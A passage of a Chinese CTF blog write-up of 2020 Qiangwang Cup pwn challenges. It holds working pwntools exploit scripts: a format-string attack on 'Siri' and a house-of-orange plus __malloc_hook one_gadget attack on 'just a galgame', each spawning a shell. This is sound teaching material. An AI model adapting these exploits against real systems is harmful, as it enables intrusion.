class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">"./Siri"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.I:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> args.R:</span><br><span class="line">    p = remote(<span class="string">'123.56.170.202'</span>, <span class="number">12124</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">"./Siri"</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Hey Siri!"</span>)</span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Remind me to %&#123;&#125;$p"</span>.format(<span class="number">0x4d</span>+<span class="number">6</span>))</span><br><span class="line">p.recvuntil(<span class="string">"OK, I'll remind you to "</span>)</span><br><span class="line">base = int(p.recvline().strip(), <span class="number">16</span>) - libc.symbols[<span class="string">'__libc_start_main'</span>] - <span class="number">231</span></span><br><span class="line"></span><br><span class="line">one_gadget = base + <span class="number">0x4f365</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Hey Siri!"</span>)</span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Remind me to %46$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"OK, I'll remind you to "</span>)</span><br><span class="line">stack = int(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr, val)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Hey Siri!"</span>)</span><br><span class="line">    payload = <span class="string">b"Remind me to "</span></span><br><span class="line">    num = val + <span class="number">256</span> - <span class="number">28</span></span><br><span class="line">    payload += <span class="string">'%&#123;&#125;cA'</span>.format(num).encode() <span class="comment"># 6</span></span><br><span class="line">    payload += <span class="string">b'%15$hhn'</span></span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    pause()</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>, payload)</span><br><span class="line">    p.recvuntil(<span class="string">"OK, I'll remind you to "</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    num = (one_gadget &gt;&gt; (i*<span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    write(stack+<span class="number">8</span>+i, num)</span><br><span class="line">pause()</span><br><span class="line">leave_ret = <span class="number">0xC1</span></span><br><span class="line">write(stack<span class="number">-280</span>, leave_ret)</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line">print(hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="just-a-galgame"><a href="#just-a-galgame" class="headerlink" title="just a galgame"></a>just a galgame</h2><p>不得不说，这道题的场景出的特别有意思，很多地方的限制还原了真实的galgame（&gt;_&lt;死宅真恶心~）。</p>
+<p>简单说一下功能，送礼物能malloc(0x68)，最多能分配7次，去看电影能做一个堆溢出修改，刚开始只有一次，但是在执行完表白之后能在获得一次修改机会，表白是申请一个0x1000长度的chunk，查看CG能输出指针内容的信息，最后是退出功能，也能写一个bss段上数据。</p>
+<p>这道题最明显的特征就是没有free的功能，可以联想到<code>house of orange</code>，这种利用技巧能在没有free的情况下把缩小过后的<code>top chunk</code>放进<code>unsorted bin</code>中，这样我们再次分配chunk的时候会从<code>unsorted bin</code>中获取，如果分配之后没有写入啥的，就可以泄露出libc地址。</p>
+<h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h3><p>这种利用技巧需要堆溢出能够覆盖到<code>top chunk</code>的size部分，让它缩小，再申请一个比它size更大的chunk，让这个<code>top chunk</code>进入<code>unsorted bin</code>中，随后堆管理器会扩大堆的大小分配一个新的<code>top chunk</code>。</p>
+<p>在这道题中，我们先申请一个chunk，用做溢出<code>top chunk</code>，随后利用看电影的功能它能溢出到size区域，由于<code>top chunk</code>需要页对齐，所以它的chunk结束处末尾的地址必须为000。由于大chunk的申请大小为0x1000，直接保留最后三位就能满足条件，这里的伪造size为0xd41。最后执行表白功能，申请大chunk，由于<code>top chunk</code>的大小不满足申请大小，也没有其他地方能够满足，最终堆管理器会把<code>top chunk</code>加入<code>unsorted bin</code>中，同时扩大堆的范围获得新的堆空间。</p>
+<p>这时，我们再次申请0x68大小的chunk，根据分配规则会从<code>unsorted bin</code>中进行切分，我们拿到的chunk之后调用输出功能，会把chunk中的数据部分打印出来，这里因为分配之后不会对chunk做初始化或者写入数据操作，能够泄露出libc地址。</p>
+<h3 id="写one-gadget"><a href="#写one-gadget" class="headerlink" title="写one_gadget"></a>写one_gadget</h3><img src="/2020/09/15/2020qwb-qwxf-pwn/5.png">
+<p>这里要用到另外一个漏洞点了，在看电影功能中会有一个在指针函数中选择指针的过程，而这个下标没有被限制，也就是说我们可以越界写数据，前提是越界的地方是有存放数据的。正好，在指针数组的下方就有一个全局的变量，同时也有功能能写入数据，这样写入我们需要的地址，通过越界访问的方式拿到地址，可以向任意地址写入0x10字节的内容。</p>
+<p>剩下的就是目标选择，这里没有free，所以选择<code>__malloc_hook</code>，向其中写入one_gadget，再次分配即可触发拿到shell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># author: hurricane618</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./Just_a_Galgame'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'D'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'R'</span>]:</span><br><span class="line">    io = remote(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">'./Just_a_Galgame'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movie</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'idx &gt;&gt; '</span>, str(index))</span><br><span class="line">    io.sendafter(<span class="string">'movie name &gt;&gt; '</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">confess</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collection</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">(data)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'5'</span>)</span><br><span class="line">    io.sendafter(<span class="string">'QAQ'</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gift()  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">movie(<span class="number">0</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xd41</span>))</span><br><span class="line">pause()</span><br><span class="line">confess()  <span class="comment"># malloc 0x1000</span></span><br><span class="line">pause()</span><br><span class="line">gift()  <span class="comment"># 1</span></span><br><span class="line">collection()  <span class="comment"># leak libc</span></span><br><span class="line"></span><br><span class="line">leak_addr = u64(io.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_addr = leak_addr - <span class="number">0x3ec2a0</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">'libc_addr: '</span> + hex(libc_addr))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_addr</span><br><span class="line"></span><br><span class="line">exit(p64(malloc_hook - <span class="number">0x60</span>))</span><br><span class="line">pause()</span><br><span class="line">movie(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line">gift()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://hurricane618.me">hurricane618</a>
+            </p><p>原文链接：<a href="https://hurricane618.me/2020/09/15/2020qwb-qwxf-pwn/">https://hurricane618.me/2020/09/15/2020qwb-qwxf-pwn/</a>
+            </p><p>发表日期：<a href="https://hurricane618.me/2020/09/15/2020qwb-qwxf-pwn/">September 15th 2020, 7:57:54 pm</a>
+            </p><p>更新日期：<a href="https://hurricane618.me/2020/09/15/2020qwb-qwxf-pwn/">September 15th 2020, 7:57:54 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2020/08/07/glibc-pwn-off-by-one-1/" title="glibc堆利用之off by one的两道CTF题目">
+                    <div class="prevTitle">glibc堆利用之off by one的两道CTF题目</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    <div id="disqus_thread"></div>
+    <script>
+        /**
+    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+        
+        var disqus_config = function () {
+        this.page.url = "https://hurricane618.me/2020/09/15/2020qwb-qwxf-pwn/";  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = "2020强网杯 强网先锋のpwn"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+        
+        (function () { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://hurricane618.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:hurricane618@hotmail.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/hurricane618" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//twitter.com/hurricane_618" class="iconfont-archer twitter" target="_blank" title="twitter"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a> record <a href="http://www.beian.miit.gov.cn">蜀ICP备17007526号</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+    
+    <span id="busuanzi_container_site_uv">已经有 <span id="busuanzi_value_site_uv"></span> 个不明生物光临此地</span>
+    
+    </div>
+    
+</footer>
+
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#babymessage"><span class="toc-number">1.</span> <span class="toc-text">babymessage</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babynote"><span class="toc-number">2.</span> <span class="toc-text">babynote</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-force-unlink-fastbin-attack"><span class="toc-number">2.1.</span> <span class="toc-text">house of force + unlink/fastbin attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-one"><span class="toc-number">2.2.</span> <span class="toc-text">off by one</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">2.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Siri"><span class="toc-number">3.</span> <span class="toc-text">Siri</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#改写hook"><span class="toc-number">3.1.</span> <span class="toc-text">改写hook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#改写返回地址"><span class="toc-number">3.2.</span> <span class="toc-text">改写返回地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">3.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#just-a-galgame"><span class="toc-number">4.</span> <span class="toc-text">just a galgame</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-orange"><span class="toc-number">4.1.</span> <span class="toc-text">house of orange</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写one-gadget"><span class="toc-number">4.2.</span> <span class="toc-text">写one_gadget</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 25
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href="/2020/09/15/2020qwb-qwxf-pwn/">2020强网杯 强网先锋のpwn</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/07</span><a class="archive-post-title" href="/2020/08/07/glibc-pwn-off-by-one-1/">glibc堆利用之off by one的两道CTF题目</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href="/2020/08/01/2020rctf-some-pwn/">2020RCTF 几道pwn题的复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span><a class="archive-post-title" href="/2020/01/13/algorithm-course-summary/">算法课程总结</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/27</span><a class="archive-post-title" href="/2019/11/27/docker-mysql-problem-check/">Docker中的Mysql配置问题处理与思考</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/2019/11/11/cnss-recruit-pwn-1/">CNSS招新题中的一道ROP题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/14</span><a class="archive-post-title" href="/2019/09/14/fancy-rop-practice/">花式栈溢出学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href="/2019/07/26/basic-rop-practice/">基础ROP学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/24</span><a class="archive-post-title" href="/2019/05/24/2019rctf-some-writeup/">2019RCTF 部分Web的WriteUp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href="/2019/04/29/2019ddctf-unsolved-writeup/">2019DDCTF 未解决的web题 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/2019ddctf-my-solutions-writeup/">2019DDCTF 部分我解决的题目writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/31</span><a class="archive-post-title" href="/2019/03/31/2019TCTF-web-writeup/">2019TCTF web writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2019/03/02/serial-ports-translation-cn/">快速寻找串行接口</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/18</span><a class="archive-post-title" href="/2019/02/18/yingshi-camera-firmware-extract/">萤石某摄像头的安全分析--固件提取</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/03</span><a class="archive-post-title" href="/2019/02/03/thinkphp-5-0-23-rce/">thinkphp 5.0.23 rce分析和复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href="/2019/01/27/haozi-xss-challenges/">haozi xss 挑战赛 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span><a class="archive-post-title" href="/2019/01/24/code-breaking-lumenserial/">code-breaking lumenserial 复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/10</span><a class="archive-post-title" href="/2019/01/10/code-breaking-esay-wp/">code-breaking easy部分题目writeup</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href="/2018/08/15/google-ctf-beginner-part2/">Google CTF Beginner Part2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href="/2018/08/01/dianfengjikeCTF-web/">巅峰极客CTF 部分Web复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/2018/07/18/google-ctf-beginner-part1/">Google CTF Beginner Part1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/08</span><a class="archive-post-title" href="/2018/07/08/google-ctf-beginner-js-safe-1/">Google CTF Beginner JS Safe 1 复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/01</span><a class="archive-post-title" href="/2018/07/01/phpmyadmin4-8-1-background-LFI/">phpmyadmin4.8.1 后台LFI</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/2018/06/30/csp-bypass-summary/">CSP绕过总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/2018/06/26/new-start/">新的开始</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="JAVA"><span class="iconfont-archer">&#xe606;</span>JAVA</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
+    
+        <span class="sidebar-tag-name" data-tags="ROP"><span class="iconfont-archer">&#xe606;</span>ROP</span>
+    
+        <span class="sidebar-tag-name" data-tags="stackoverflow"><span class="iconfont-archer">&#xe606;</span>stackoverflow</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="Mysql"><span class="iconfont-archer">&#xe606;</span>Mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="闲聊"><span class="iconfont-archer">&#xe606;</span>闲聊</span>
+    
+        <span class="sidebar-tag-name" data-tags="IOT"><span class="iconfont-archer">&#xe606;</span>IOT</span>
+    
+        <span class="sidebar-tag-name" data-tags="heap"><span class="iconfont-archer">&#xe606;</span>heap</span>
+    
+        <span class="sidebar-tag-name" data-tags="CSP"><span class="iconfont-archer">&#xe606;</span>CSP</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="翻译"><span class="iconfont-archer">&#xe606;</span>翻译</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="技术"><span class="iconfont-archer">&#xe60a;</span>技术</span>
+    
+        <span class="sidebar-category-name" data-categories="杂谈"><span class="iconfont-archer">&#xe60a;</span>杂谈</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "hurricane618"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
